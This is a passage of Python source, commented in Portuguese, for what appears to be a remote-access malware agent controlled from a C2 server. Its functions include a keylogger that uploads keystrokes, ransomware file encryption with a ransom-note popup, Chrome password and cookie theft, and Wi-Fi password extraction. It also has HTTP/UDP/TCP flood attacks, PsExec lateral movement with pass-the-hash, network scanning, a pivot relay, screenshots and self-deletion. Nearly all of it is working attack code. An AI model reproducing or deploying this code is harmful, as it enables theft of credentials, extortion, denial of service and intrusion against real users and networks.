            # O nome da chave de registro que o agente cria
            registry_key_name = "WindowsSystemUpdate"
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            command = f'reg delete HKCU\\{key_path} /v {registry_key_name} /f'
            subprocess.run(command, shell=True, capture_output=True)
            
            # Comando para agendar a auto-deleção após um pequeno atraso
            delete_command = f'ping 127.0.0.1 -n 4 > NUL && del /F "{executable_path}"'
            subprocess.Popen(delete_command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

        elif system == "Linux":
            # Lógica de limpeza para Linux
            executable_cmd = f"python3 {executable_path}" if not getattr(sys, 'frozen', False) else executable_path
            command = f"(crontab -l | grep -v -F '{executable_cmd}' ; ) | crontab -"
            subprocess.run(command, shell=True, capture_output=True)
            
            delete_command = f'sleep 3 && rm -f "{executable_path}"'
            subprocess.Popen(delete_command, shell=True)
        
        # Envia uma mensagem final de sucesso antes de sair
        send_result("cleanup_task", "Persistência removida e autodestruição agendada. Desconectando...", "info")
        sys.exit(0)

    except Exception as e:
        # Se qualquer parte do processo de limpeza falhar, captura o erro e o reporta
        return f"Falha na limpeza: {e}", "error"

# Em agent.py

def show_ransom_note(note_text):
    system = platform.system()
    try:
        if system == "Windows":
            # --- INÍCIO DA CORREÇÃO ---
            # Encontra o caminho completo para o powershell.exe
            powershell_path = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "WindowsPowerShell", "v1.0", "powershell.exe")

            # Verifica se o executável realmente existe antes de tentar usá-lo
            if not os.path.exists(powershell_path):
                return f"Falha crítica: powershell.exe não encontrado em '{powershell_path}'.", "error"
            # --- FIM DA CORREÇÃO ---

            safe_text = note_text.replace("'", "''").replace("\\n", "`n")
            command = f"""Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('{safe_text}', 'AVISO IMPORTANTE', 'OK', 'Warning');"""
            
            # Usa o caminho completo na chamada do subprocess
            subprocess.Popen(
                [powershell_path, '-WindowStyle', 'Hidden', '-Command', command], 
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
            )
            
            return "Nota de resgate exibida ao usuário via PowerShell.", "ransom_note_displayed"
         
        elif system == "Linux":
            safe_text = note_text.replace('\\n', '\n')
            if shutil.which("zenity"):
                subprocess.Popen(['zenity', '--warning', '--title=AVISO IMPORTANTE', f'--text={safe_text}'])
                return "Nota de resgate exibida ao usuário via Zenity.", "ransom_note_displayed"
            elif shutil.which("kdialog"):
                subprocess.Popen(['kdialog', '--error', safe_text, '--title', 'AVISO IMPORTANTE'])
                return "Nota de resgate exibida ao usuário via KDialog.", "ransom_note_displayed"
            else:
                return "Falha ao exibir nota: Nenhuma ferramenta GUI (zenity, kdialog) encontrada no alvo Linux.", "error"
        else:
            return f"SO '{system}' não suportado para exibição de pop-up.", "error"
    except Exception as e:
        return f"Falha ao exibir nota de resgate: {e}", "error"

        
# --- INÍCIO DO NOVO BLOCO DO KEYLOGGER ---

keylog_buffer = []  # Usaremos uma lista para ser mais eficiente
buffer_lock = threading.Lock()
keylogger_thread = None
keylogger_active = threading.Event()
KEYLOG_REPORT_INTERVAL = 15  # Enviar logs a cada 15 segundos

def report_keylogs():
    """
    Pega o conteúdo do buffer, junta em uma única string e envia para o C2.
    """
    global keylog_buffer
    
    # Se não houver nada no buffer, não faz nada.
    if not keylog_buffer:
        return

    buffer_to_send = ""
    with buffer_lock:
        buffer_to_send = "".join(keylog_buffer)
        keylog_buffer = []  # Limpa o buffer após a cópia

    if buffer_to_send:
        write_internal_log(f"Enviando bloco de keylog com {len(buffer_to_send)} caracteres.")
        # O task_id aqui é genérico, pois não corresponde a um comando único
        send_result("keylogger_report_task", buffer_to_send, "keylogger_data")

def keylogger_run():
    """
    A função principal da thread do keylogger.
    Inicia o listener e entra em um loop para reportar os logs periodicamente.
    """
    if not Listener or platform.system() != "Windows":
        write_internal_log("Keylogger não iniciado: Pynput não instalado ou SO não é Windows.")
        return

    import win32gui  # Importação local para manter a compatibilidade
    last_window_title = [None] # Usamos uma lista para que a função aninhada possa modificar

    def on_press(key):
        """
        Esta função é chamada para CADA tecla pressionada.
        Sua única responsabilidade é adicionar a tecla e o contexto da janela ao buffer.
        """
        try:
            current_window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            
            with buffer_lock:
                # Se a janela mudou, adiciona o novo título ao log
                if current_window_title != last_window_title[0]:
                    last_window_title[0] = current_window_title
                    keylog_buffer.append(f"\n[Janela: {current_window_title}]\n")
                
                # Converte a tecla para string e adiciona ao buffer
                if hasattr(key, 'char') and key.char is not None:
                    keylog_buffer.append(key.char)
                elif key == Key.space:
                    keylog_buffer.append(" ")
                elif key == Key.enter:
                    keylog_buffer.append("[enter]\n")
                elif key == Key.backspace:
                    keylog_buffer.append("[backspace]")
                else:
                    # Para outras teclas especiais como Shift, Ctrl, etc.
                    keylog_buffer.append(f"[{str(key).split('.')[-1]}]")
        except Exception as e:
            write_internal_log(f"Erro em on_press do keylogger: {e}")

    # Inicia o listener de teclas
    listener = Listener(on_press=on_press)
    listener.start()
    write_internal_log("Listener do keylogger iniciado.")

    # Loop principal da thread: envia os logs a cada X segundos
    while keylogger_active.is_set():
        time.sleep(KEYLOG_REPORT_INTERVAL)
        report_keylogs()
    
    # Quando o loop termina, para o listener e envia os logs restantes
    listener.stop()
    report_keylogs()
    write_internal_log("Listener do keylogger finalizado.")

def start_keylogger(args=None):
    """Inicia a thread do keylogger."""
    global keylogger_thread
    if keylogger_thread and keylogger_thread.is_alive():
        return "Keylogger já está ativo.", "info"
    
    keylogger_active.set()
    keylogger_thread = threading.Thread(target=keylogger_run, daemon=True)
    keylogger_thread.start()
    return "Keylogger iniciado com sucesso.", "keylogger_started"

def stop_keylogger(args=None):
    """Para a thread do keylogger."""
    if not keylogger_thread or not keylogger_thread.is_alive():
        return "Keylogger não estava ativo.", "info"
    
    keylogger_active.clear() # Sinaliza para a thread parar
    return "Sinal de parada enviado ao keylogger. Logs restantes serão enviados.", "keylogger_stopped"

# --- FIM DO NOVO BLOCO DO KEYLOGGER ---
    


def check_privileges():
    system = platform.system()
    try:
        if system == "Windows": return "Administrador" if ctypes.windll.shell32.IsUserAnAdmin() != 0 else "Usuário Padrão"
        elif system == "Linux": return "Root" if os.geteuid() == 0 else "Usuário Padrão"
        else: return "N/A"
    except: return "Desconhecido"


# --- Register com criptografia --- #

def register_with_c2():
    global AGENT_ID
    write_internal_log("Tentando registrar com o C2...")
    try:
        sys_info, _ = capture_system_info()
        sys_info['privileges'] = check_privileges()
        sys_info['agent_version'] = AGENT_VERSION

        payload_json = json.dumps(sys_info)
        encrypted_payload = encrypt_data(payload_json, C2_AES_KEY)
        if not encrypted_payload:
            return False

        payload_bytes = encrypted_payload.encode('utf-8')
        auth_headers = get_authenticated_headers(payload_bytes)

        response = session.post(
            SERVER_URL + "/register", 
            data=payload_bytes, 
            headers=auth_headers
        )

        # --- INÍCIO DA CORREÇÃO DE DEBUG ---
        # Adiciona logs para inspecionar a resposta do servidor ANTES de tentar descriptografar.
        write_internal_log(f"Resposta do C2 recebida. Status: {response.status_code}")
        write_internal_log(f"Resposta Bruta (Conteúdo): {response.content}")
        # --- FIM DA CORREÇÃO DE DEBUG ---

        if response.status_code == 200:
            response_json_str = decrypt_data(response.content, C2_AES_KEY)
            
            # Adiciona uma checagem para evitar o erro
            if not response_json_str:
                write_internal_log("Falha ao DECRIPTOGRAFAR resposta de registro do C2. A resposta pode estar vazia, corrompida ou a chave AES está errada.")
                return False
                
            response_data = json.loads(response_json_str)
            AGENT_ID = response_data.get("agent_id")
            
            if AGENT_ID:
                write_internal_log(f"Registro bem-sucedido. AGENT_ID: {AGENT_ID}")
                return True
            else:
                write_internal_log("Resposta de registro bem-sucedida, mas sem AGENT_ID.")
                return False
        else:
            # Este log agora é ainda mais útil
            write_internal_log(f"Falha no registro. Status Code: {response.status_code}. Corpo da Resposta: {response.text}")
            return False
    except Exception as e:
        write_internal_log(f"Erro de conexão durante o registro: {e}")
        import traceback
        write_internal_log(traceback.format_exc()) # Loga o traceback completo
        return False




def capture_wifi_passwords(args=None):
    """
    Extrai senhas de perfis Wi-Fi salvos no Windows.
    Usa o utilitário nativo 'netsh' e faz o parse da saída.
    """
    if platform.system() != "Windows":
        return "Este comando é aplicável apenas no Windows.", "error"

    # --- INÍCIO DA CORREÇÃO: Caminho Absoluto ---
    # Garante que o comando funcione mesmo se C:\Windows\System32 não estiver no PATH.
    system_root = os.environ.get("SystemRoot", "C:\\Windows")
    netsh_path = os.path.join(system_root, "System32", "netsh.exe")

    if not os.path.exists(netsh_path):
        return f"Erro crítico: '{netsh_path}' não encontrado.", "error"
    # --- FIM DA CORREÇÃO ---

    try:
        # 1. Lista todos os perfis Wi-Fi salvos
        command = f'"{netsh_path}" wlan show profiles'
        profiles_output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, encoding='cp850', errors='ignore')
        
        # Extrai os nomes dos perfis (SSIDs) da saída
        profile_names = [line.split(":")[1].strip() for line in profiles_output.split('\n') if "All User Profile" in line or "Perfil de Todos os Usuários" in line]
        
        wifi_credentials = []
        for profile_name in profile_names:
            try:
                # 2. Para cada perfil, obtém os detalhes, incluindo a senha em texto claro
                # A opção 'key=clear' força a exibição da senha. Requer privilégios de Administrador.
                password_command = f'"{netsh_path}" wlan show profile name="{profile_name}" key=clear'
                profile_info = subprocess.check_output(password_command, shell=True, stderr=subprocess.STDOUT, encoding='cp850', errors='ignore')
                
                password = "N/A (Requer Admin ou rede aberta)"
                # Procura pela senha na saída (em português e inglês)
                for line in profile_info.split('\n'):
                    if "Key Content" in line or "Conteúdo da Chave" in line:
                        password = line.split(":")[1].strip()
                        break
                
                wifi_credentials.append({"ssid": profile_name, "password": password})
            except subprocess.CalledProcessError:
                # Isso geralmente acontece se o perfil não tiver uma senha salva
                wifi_credentials.append({"ssid": profile_name, "password": "N/A (Sem senha ou erro)"})
        
        if not wifi_credentials:
            return "Nenhum perfil Wi-Fi encontrado no sistema.", "info"

        return wifi_credentials, "wifi_credentials_result"

    except subprocess.CalledProcessError as e:
        # Se o primeiro comando (show profiles) falhar, pode ser que o Wi-Fi esteja desativado.
        error_output = e.output
        if "não está executando" in error_output or "is not running" in error_output:
            return "Erro: O serviço WLAN AutoConfig não está em execução no alvo.", "error"
        return f"Erro ao executar netsh: {error_output}", "error"
    except Exception as e:
        return f"Erro inesperado ao capturar senhas de Wi-Fi: {e}", "error"


def scan_port(ip, port, open_ports_dict, lock):
    """Tenta se conectar a uma única porta em um IP para verificar se está aberta."""
    try:
        # Cria um socket para a conexão
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Define um timeout muito curto (0.5s) para não travar o agente
        sock.settimeout(0.5)
        # connect_ex retorna 0 se a conexão for bem-sucedida (porta aberta)
        result = sock.connect_ex((str(ip), port))
        sock.close()
        
        if result == 0:
            # Usa um 'lock' para adicionar a porta à lista de forma segura entre as threads
            with lock:
                if str(ip) not in open_ports_dict:
                    open_ports_dict[str(ip)] = []
                open_ports_dict[str(ip)].append(port)
    except Exception:
        pass # Ignora quaisquer outros erros


# ==============================================================================
# INÍCIO DO MÓDULO DE ATAQUE COORDENADO
# ==============================================================================

# --- Funções de Worker (o que cada thread faz) ---

def worker_http_flood(target_url, stop_event ):
    """Envia requisições GET para uma URL."""
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
    while not stop_event.is_set():
        try:
            requests.get(target_url, headers=headers, timeout=2)
        except Exception:
            pass

def worker_udp_flood(target_ip, target_port, stop_event):
    """Envia pacotes UDP com dados aleatórios."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 bytes de dados aleatórios
    payload = get_random_bytes(1024)
    while not stop_event.is_set():
        try:
            sock.sendto(payload, (target_ip, target_port))
        except Exception:
            pass

def worker_tcp_flood(target_ip, target_port, stop_event):
    """Envia pacotes TCP SYN (inicia conexões e as abandona)."""
    while not stop_event.is_set():
        try:
            # Cria um novo socket a cada iteração para um novo SYN
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            # A conexão em si é o ataque. Não precisamos enviar dados.
            sock.connect((target_ip, target_port))
            # Fechamos imediatamente para não esgotar os recursos locais rapidamente.
            # O alvo, no entanto, terá que lidar com o handshake.
            sock.close()
        except Exception:
            pass

# --- Dicionário de Métodos de Ataque ---

ATTACK_METHODS = {
    "http_get": worker_http_flood,
    "udp": worker_udp_flood,
    "tcp_syn": worker_tcp_flood
}

# --- Função Principal da Tarefa ---

def start_attack(args ):
    """
    Função despachante que inicia um ataque de flood com base nos argumentos fornecidos.
    'args': {"method": "...", "target": "...", "port": ..., "duration": ..., "threads": ...}
    """
    try:
        # 1. Validar e extrair argumentos
        method = args.get("method")
        target = args.get("target") # Pode ser uma URL ou um IP
        port = int(args.get("port", 80))
        duration = int(args.get("duration", 60))
        num_threads = int(args.get("threads", 50))

        if not all([method, target]):
            return "Erro: 'method' e 'target' são argumentos obrigatórios.", "error"

        if method not in ATTACK_METHODS:
            return f"Erro: Método de ataque '{method}' desconhecido. Métodos suportados: {list(ATTACK_METHODS.keys())}", "error"

        # 2. Selecionar a função worker correta
        worker_function = ATTACK_METHODS[method]
        
        # Para HTTP, o alvo é a URL completa. Para outros, é o IP.
        worker_args = (target, port) if method != "http_get" else (target, )

        write_internal_log(f"Iniciando ataque '{method}' para {target}:{port} com {num_threads} threads por {duration}s.")

        # 3. Lógica de execução com threads (comum a todos os ataques)
        stop_event = threading.Event()
        threads = []

        for _ in range(num_threads):
            # Adiciona o stop_event como último argumento para o worker
            thread_args = worker_args + (stop_event,)
            thread = threading.Thread(target=worker_function, args=thread_args)
            thread.daemon = True
            threads.append(thread)
            thread.start()

        # Mantém o ataque rodando pela duração especificada
        time.sleep(duration)

        # Sinaliza para todas as threads pararem
        stop_event.set()

        # Espera um pouco para as threads encerrarem
        for thread in threads:
            thread.join(timeout=1.0)

        success_message = f"Ataque '{method}' para {target} concluído após {duration} segundos."
        write_internal_log(success_message)
        return success_message, "info"

    except Exception as e:
        import traceback
        error_message = f"Falha ao iniciar o ataque: {e}\n{traceback.format_exc()}"
        write_internal_log(error_message)
        return error_message, "error"



def lateral_psexec(args):
    """
    Executa um comando em um alvo remoto usando uma implementação em Python do PsExec (via impacket).
    Args esperados: {'target_ip': '...', 'username': '...', 'password': '...', 'domain': '...', 'command': '...'}
    O hash NTLM pode ser usado no lugar da senha.
    """
    if platform.system() != "Windows":
        return "Movimento lateral com PsExec só é suportado a partir de um agente Windows.", "error"

    try:
        target_ip = args.get('target_ip')
        username = args.get('username')
        password = args.get('password', '')
        domain = args.get('domain', '')
        command = args.get('command')
        lmhash = ''
        nthash = ''

        if not all([target_ip, username, command]):
            return "Erro: 'target_ip', 'username', e 'command' são obrigatórios.", "error"

        # Suporte para Pass-the-Hash
        if ':' in password and len(password) == 65:
            try:
                lmhash, nthash = password.split(':')
                password = ''
                write_internal_log(f"Usando Pass-the-Hash para {username}.")
            except ValueError:
                # Não é um hash válido, trata como senha normal
                pass

        write_internal_log(f"Movimento Lateral (PsExec): Tentando conectar a {target_ip} como {domain}\\{username}")
        
        smb = SMBConnection(target_ip, target_ip, sess_port=445, timeout=60)
        smb.login(username, password, domain, lmhash, nthash)

        rpc_transport = transport.SMBTransport(target_ip, target_ip, filename=r'\pipe\svcctl', smb_connection=smb)
        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        dce.bind(dcerpc_scmr.MSRPC_UUID_SCMR)
        
        service_name = ''.join(random.choices(string.ascii_letters, k=8))
        # Redireciona a saída e o erro para um arquivo temporário na unidade C$ do alvo
        command_to_run = f'%COMSPEC% /C {command} > \\\\127.0.0.1\\C$\\__output 2>&1'
        
        scm_handle = dcerpc_scmr.hROpenSCManagerW(dce)
        resp = dcerpc_scmr.hRCreateServiceW(dce, scm_handle, service_name, service_name, lpBinaryPathName=command_to_run)
        service_handle = resp['lpServiceHandle']
        
        try:
            dcerpc_scmr.hRStartServiceW(dce, service_handle)
            write_internal_log(f"Movimento Lateral (PsExec): Comando '{command}' executado com sucesso em {target_ip}.")
        finally:
            # Bloco de limpeza: garante que o serviço seja parado e deletado
            try:
                dcerpc_scmr.hRDeleteService(dce, service_handle)
            except:
                pass
            dcerpc_scmr.hRCloseServiceHandle(dce, service_handle)

        # Tenta ler o resultado do arquivo de saída
        output = ""
        time.sleep(3) # Espera o comando terminar e escrever no arquivo
        try:
            # Reautentica se necessário para ler o arquivo
            smb.connect() 
            smb.login(username, password, domain, lmhash, nthash)
            # O caminho para o arquivo de saída na share C$
            file_path = ntpath.join('C$', '__output')
            
            # Usa um objeto de arquivo temporário para ler os dados
            temp_file = tempfile.NamedTemporaryFile()
            smb.getFile(file_path.split('$')[0] + '$', file_path.split('\\')[1], temp_file.write)
            temp_file.seek(0)
            output = temp_file.read().decode('cp437', errors='ignore')
            temp_file.close()
            
            smb.deleteFile('C$', '__output')
        except Exception as e:
            output = f"Comando executado, mas não foi possível capturar a saída: {e}"

        smb.logoff()
        return f"Execução remota em {target_ip} concluída.\n\nSaída:\n{output}", "psexec_result"

    except Exception as e:
        error_msg = f"Erro durante a execução do PsExec: {e}"
        write_internal_log(error_msg)
        import traceback
        write_internal_log(traceback.format_exc())
        return error_msg, "error"

def scan_internal_network(args=None):
    """
    Realiza um scan de rede em duas fases:
    1. Ping scan para encontrar hosts vivos.
    2. Port scan em portas comuns nos hosts vivos.
    """
    try:
        host_name = socket.gethostname()
        host_ip = socket.gethostbyname(host_name)
        net = ipaddress.ip_network(f"{host_ip}/24", strict=False)
        
        # --- Fase 1: Encontrar Hosts Vivos (Ping Scan) ---
        write_internal_log("Iniciando Fase 1: Ping Scan para encontrar hosts vivos...")
        live_hosts = []
        threads = []
        lock = threading.Lock()
        for ip in net.hosts():
            thread = threading.Thread(target=ping_host, args=(ip, live_hosts, lock), daemon=True)
            threads.append(thread)
            thread.start()
        for thread in threads: thread.join(timeout=2.0) # Espera as threads de ping terminarem
        write_internal_log(f"Ping Scan concluído. {len(live_hosts)} hosts encontrados.")

        # --- Fase 2: Escanear Portas nos Hosts Vivos (Port Scan) ---
        write_internal_log("Iniciando Fase 2: Port Scan nos hosts vivos...")
        ports_to_scan = [21, 22, 80, 135, 443, 445, 3389, 5985, 6379, 7443, 8080, 8443, 9090, 9999]
        open_ports_by_host = {}
        port_scan_threads = []
        port_lock = threading.Lock()

        for ip in live_hosts:
            for port in ports_to_scan:
                thread = threading.Thread(target=scan_port, args=(ip, port, open_ports_by_host, port_lock), daemon=True)
                port_scan_threads.append(thread)
                thread.start()
        
        for thread in port_scan_threads: thread.join(timeout=1.0) # Espera as threads de port scan
        write_internal_log("Port Scan concluído.")

        # Monta o relatório final
        report = {
            "agent_ip": host_ip,
            "network": str(net),
            "live_hosts_found": len(live_hosts),
            "scan_results": open_ports_by_host # Dicionário com IP: [portas_abertas]
        }
        return report, "network_scan_result"

    except Exception as e:
        return f"Erro ao escanear a rede: {e}", "error"

def ping_host(ip, live_hosts, lock):
    system = platform.system()
    try:
        if system == "Windows":
            command = ["ping", "-n", "1", "-w", "500", str(ip)]
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            creationflags = subprocess.CREATE_NO_WINDOW
        else:
            command = ["ping", "-c", "1", "-W", "0.5", str(ip)]
            startupinfo = None
            creationflags = 0
        
        result = subprocess.run(command, capture_output=True, startupinfo=startupinfo, creationflags=creationflags)
        if result.returncode == 0:
            with lock:
                live_hosts.append(str(ip))
    except Exception:
        pass

def encrypt_files_on_target(target_path):
    if not AES: return "Erro: Biblioteca PyCryptodomex não encontrada.", "error"
    if not os.path.isdir(target_path): return f"Erro: O caminho '{target_path}' não é um diretório válido.", "error"
    key = get_random_bytes(32)
    encrypted_files, errors = [], []
    for root, dirs, files in os.walk(target_path):
        for filename in files:
            file_path = os.path.join(root, filename)
            if file_path == sys.executable or file_path.endswith('.encrypted'): continue
            try:
                with open(file_path, 'rb') as f_in: data = f_in.read()
                cipher = AES.new(key, AES.MODE_CBC)
                ciphertext_bytes = cipher.encrypt(pad(data, AES.block_size))
                with open(file_path, 'wb') as f_out: f_out.write(cipher.iv); f_out.write(ciphertext_bytes)
                new_file_path = file_path + ".encrypted"; os.rename(file_path, new_file_path)
                encrypted_files.append(new_file_path)
            except Exception as e: errors.append(f"Falha ao criptografar {file_path}: {e}")
    report = {"status": "Concluído", "target_directory": target_path, "files_encrypted": len(encrypted_files), "errors_encountered": len(errors), "encryption_key_base64": base64.b64encode(key).decode('utf-8'), "details": {"encrypted_files_list": encrypted_files, "error_log": errors}}
    return report, "encryption_report"

def decrypt_files_on_target(args):
    if not AES: return "Erro: Biblioteca PyCryptodomex não encontrada no agente.", "error"
    try: target_path = args['target_path']; key_b64 = args['key_b64']
    except KeyError: return "Erro: Argumentos 'target_path' ou 'key_b64' faltando.", "error"
    if not os.path.isdir(target_path): return f"Erro: O caminho '{target_path}' não é um diretório válido no alvo.", "error"
    try:
        key = base64.b64decode(key_b64)
        if len(key) != 32: return "Erro: A chave de descriptografia fornecida é inválida (tamanho incorreto).", "error"
    except Exception: return "Erro: A chave de descriptografia fornecida não é uma string Base64 válida.", "error"
    decrypted_files, errors = [], []
    for root, dirs, files in os.walk(target_path):
        for filename in files:
            if filename.endswith(".encrypted"):
                file_path = os.path.join(root, filename)
                try:
                    with open(file_path, 'rb') as f_in: iv = f_in.read(16); ciphertext = f_in.read()
                    cipher = AES.new(key, AES.MODE_CBC, iv)
                    original_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
                    original_path = file_path[:-len(".encrypted")]
                    with open(original_path, 'wb') as f_out: f_out.write(original_data)
                    os.remove(file_path)
                    decrypted_files.append(original_path)
                except Exception as e: errors.append(f"Falha ao descriptografar {file_path}: {e}")
    report = {"status": "Concluído", "target_directory": target_path, "files_decrypted": len(decrypted_files), "errors_encountered": len(errors), "error_log": errors}
    return report, "decryption_report"


def download_from_target(remote_path):
    try:
        if not os.path.exists(remote_path) or not os.path.isfile(remote_path): return f"Erro: Arquivo não encontrado em '{remote_path}'", "error"
        with open(remote_path, 'rb') as f: file_content = f.read()
        return {"filename": os.path.basename(remote_path), "content_b64": base64.b64encode(file_content).decode('utf-8')}, "file_download"
    except Exception as e: return f"Erro ao ler o arquivo: {e}", "error"

def upload_to_target(args): # <-- MUDANÇA AQUI: aceita um único argumento 'args'
    """
    Recebe um dicionário de argumentos, extrai o caminho de destino e o conteúdo,
    e salva o arquivo no alvo.
    """
    try:
        # Desempacota os valores de dentro do dicionário 'args'
        destination_path = args['destination_path']
        file_content_b64 = args['file_content_b64']
    except KeyError:
        return "Erro: Argumentos 'destination_path' ou 'file_content_b64' faltando no comando de upload.", "error"
    except TypeError:
        return "Erro: Formato de argumentos inválido para upload.", "error"

    try:
        file_content = base64.b64decode(file_content_b64)
        dir_name = os.path.dirname(destination_path)
        if dir_name: 
            os.makedirs(dir_name, exist_ok=True)
        with open(destination_path, 'wb') as f:
            f.write(file_content)
        return f"Arquivo salvo com sucesso em: {destination_path}", "upload_success"
    except Exception as e:
        return f"Erro ao salvar o arquivo: {e}", "error"


def get_chrome_path(component: str) -> str:
    system = platform.system()
    if system == "Windows": base_path = os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data")
    elif system == "Linux": base_path = os.path.expanduser("~/.config/google-chrome")
    elif system == "Darwin": base_path = os.path.expanduser("~/Library/Application Support/Google/Chrome")
    else: return None
    path_map = {"Local State": os.path.join(base_path, "Local State"), "Login Data": os.path.join(base_path, "Default", "Login Data"), "History": os.path.join(base_path, "Default", "History")}
    return path_map.get(component)

def get_encryption_key():
    local_state_path = get_chrome_path("Local State")
    if not local_state_path or not os.path.exists(local_state_path): return None
    with open(local_state_path, "r", encoding="utf-8") as f: local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    system = platform.system()
    if system == "Windows" and win32crypt: return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    elif system == "Linux" and AES: return encrypted_key
    return None

def decrypt_password(password: bytes, key: bytes) -> str:
    """Tenta descriptografar senhas do Chrome v80+ (GCM) e pre-v80 (DPAPI) no Windows."""
    system = platform.system()
    try:
        if system == "Windows":
            # --- Início da Correção para Chrome v80+ ---
            try:
                
                if password.startswith(b'v10') or password.startswith(b'v11'):
                    nonce = password[3:15]
                    ciphertext_with_tag = password[15:]
                    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                    
                    # A função decrypt_and_verify lida com o ciphertext e o tag (últimos 16 bytes)
                    decrypted_pass = cipher.decrypt_and_verify(ciphertext_with_tag[:-16], ciphertext_with_tag[-16:])
                    return decrypted_pass.decode('utf-8')
                else:
                    # É um formato antigo (pre-v80), usa DPAPI direto no blob da senha
                    return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
            except Exception:
                # Se o GCM falhar (chave errada?) OU o DPAPI falhar, caia no DPAPI antigo como último recurso
                try:
                    return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
                except Exception as e_dpapi:
                    write_internal_log(f"Falha na descriptografia GCM e DPAPI. Erro final: {e_dpapi}")
                    return "Nao foi possivel descriptografar (Ambos os metodos falharam)"
            # --- Fim da Correção ---
        
        elif system == "Linux" and AES:
           
            iv, payload = password[3:15], password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()

    except Exception as e_geral:
        write_internal_log(f"Erro geral em decrypt_password: {e_geral}")
        return "Nao foi possivel descriptografar" # O catch-all original
        
    return "SO nao suportado"

def capture_credentials(args=None):
    key = get_encryption_key()
    if not key: return "Nao foi possivel obter a chave de criptografia.", "error"
    db_path = get_chrome_path("Login Data")
    if not db_path or not os.path.exists(db_path): return "Banco de dados de login nao encontrado.", "error"
    temp_db = "temp_login_data.db"
    shutil.copy2(db_path, temp_db)
    credentials = []
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            origin_url, action_url, username, encrypted_password = row
            if username and encrypted_password:
                credentials.append({"origin_url": origin_url, "action_url": action_url, "username": username, "password": decrypt_password(encrypted_password, key)})
        conn.close()
    except Exception as e: return str(e), "error"
    finally:
        if os.path.exists(temp_db):
            os.remove(temp_db)
    return credentials, "credentials_result"


# --- LÓGICA DE PIVOTEAMENTO (v2.9) ---

class PivotRequestHandler(BaseHTTPRequestHandler):
   
    def relay_request(self, method="GET", body_bytes=None):
        try:
            # Ex: (do filho) /get_task/uuid -> (para o C2) http://real_c2_url/get_task/uuid
            target_url = f"{SERVER_URL}{self.path}"

            headers = {'User-Agent': FAKE_USER_AGENT}
            
            if method == "POST":
                response = requests.post(target_url, data=body_bytes, headers=headers, timeout=15)
            else: # GET
                response = requests.get(target_url, headers=headers, timeout=15)

            # Envia a resposta do C2 real de volta para o agente-filho
            self.send_response(response.status_code)
            for key, value in response.headers.items():
                if key not in ['Transfer-Encoding', 'Content-Encoding']: # Evita problemas de 'chunking'
                     self.send_header(key, value)
            self.end_headers()
            self.wfile.write(response.content)

        except Exception as e:
            write_internal_log(f"[PIVOT-ERROR] Falha ao retransmitir requisição para o C2: {e}")
            self.send_error(502, "Gateway Mal-sucedido (Falha no Relay do Pivot)")

    def do_GET(self):
        # O agente-filho está pedindo uma tarefa
        write_internal_log(f"[PIVOT-GET] Recebido GET do filho: {self.path}")
        self.relay_request(method="GET")

    def do_POST(self):
        # O agente-filho está se registrando ou enviando um resultado
        write_internal_log(f"[PIVOT-POST] Recebido POST do filho: {self.path}")
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length) # Lê o body (criptografado)
        self.relay_request(method="POST", body_bytes=post_data)

    def log_message(self, format, *args):
        # Silencia o log padrão do http.server para não poluir o stdout da vítima
        pass

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """ Um servidor HTTP que usa threads para lidar com cada conexão """
    daemon_threads = True # Permite que o agente principal saia

def start_pivot_listener(args):
    """
    Função principal da tarefa: Inicia o servidor de relay HTTP em uma thread.
    'args' deve ser a porta, ex: "8080"
    """
    global active_pivot_server
    if 'active_pivot_server' in globals() and active_pivot_server:
        return "Erro: Um listener de pivoteamento já está ativo.", "error"
        
    try:
        port = int(args)
        server_address = ('0.0.0.0', port)
        
        httpd = ThreadedHTTPServer(server_address, PivotRequestHandler)
        
        # Inicia o servidor em uma thread daemon separada
        server_thread = threading.Thread(target=httpd.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        
        globals()['active_pivot_server'] = httpd # Armazena a referência para podermos pará-lo depois
        msg = f"Sucesso: Listener de Pivoteamento HTTP iniciado em 0.0.0.0:{port}. Thread: {server_thread.name}"
        write_internal_log(msg)
        return msg, "info"
        
    except Exception as e:
        msg = f"Falha ao iniciar listener de pivoteamento: {e}"
        write_internal_log(msg)
        return msg, "error"

def capture_screenshot(args=None):
    try:
        screenshot_path = "screenshot.png"
        ImageGrab.grab().save(screenshot_path)
        with open(screenshot_path, "rb") as file: screenshot_data = base64.b64encode(file.read()).decode("utf-8")
        os.remove(screenshot_path)
        return screenshot_data, "screenshot_result"
    except Exception as e: return str(e), "error"

def capture_cookies(args=None):
    try:
        cookies = {}
        for browser in ["chrome", "firefox", "edge", "opera"]:
            try: cookies[browser.capitalize()] = {c.name: c.value for c in getattr(browser_cookie3, browser)()}
            except: continue
        return cookies, "cookies_result"
    except Exception as e: return str(e), "error"

